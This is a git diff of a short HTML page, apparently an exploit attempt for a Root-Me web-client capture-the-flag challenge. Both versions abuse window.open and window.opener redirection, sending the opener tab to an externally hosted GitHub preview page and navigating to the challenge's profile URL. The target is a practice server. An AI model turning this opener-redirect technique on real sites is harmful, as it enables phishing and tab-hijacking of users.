@@ -1,20 +1,11 @@
-<!DOCTYPE html>
-<body>
-<script>
-    console.log('window',window.opener)
-    let a = null
-    let c = null
-    /*if(!window.opener.opener){
-        a = window.open('http://127.0.0.1:3000/opener.html','_blank')
-        console.log('a',a)
-        a.onload = function() {
-            console.log('New window loaded:', a);
-            c = a.window.document 
-            console.log('c',c)
-            a.window.location = 'http://challenge01.root-me.org:58003/profile'
-        };
-    }*/
-    window.opener.location = 'https://html-preview.github.io/?url=https://raw.githubusercontent.com/BlackMirrors/web-client/refs/heads/main/index.html'
-</script>    
-</body>
+<html>
+    <body>
+        <script>
+            var a = window.open('https://html-preview.github.io/?url=https://github.com/BlackMirrors/web-client/blob/main/redirect.html')
+            setTimeout(()=> {
+                location = 'http://challenge01.root-me.org:58003/profile'
+            },100)
+            
+        </script>
+    </body>
 </html>
